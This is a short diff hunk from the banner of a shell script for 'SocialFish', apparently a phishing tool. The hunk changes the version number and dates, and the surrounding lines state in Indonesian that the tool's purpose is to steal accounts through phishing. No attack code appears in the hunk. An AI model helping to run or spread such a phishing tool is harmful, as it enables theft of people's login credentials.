@@ -156,8 +156,8 @@ printf "\e[0;100;77;1m[         SocialFish, My Github: @stepbystepexe          ]
 toilet -f smslant 'SocialFish'
 printf "
 Nama        : SocialFish
-Versi       : 4.3 (Update: 10 Agustus 2020, 3:30 AM)
-Tanggal     : 28 Februari 2019
+Versi       : 1.1 (Update: 15 Janiari 2020, 3:30 AM)
+Tanggal     : 25 Juli 2019
 Mod         : Nedi Senja
 Tujuan      : Mencuri akun menggunakan metode
               Modern Phising SocialFish
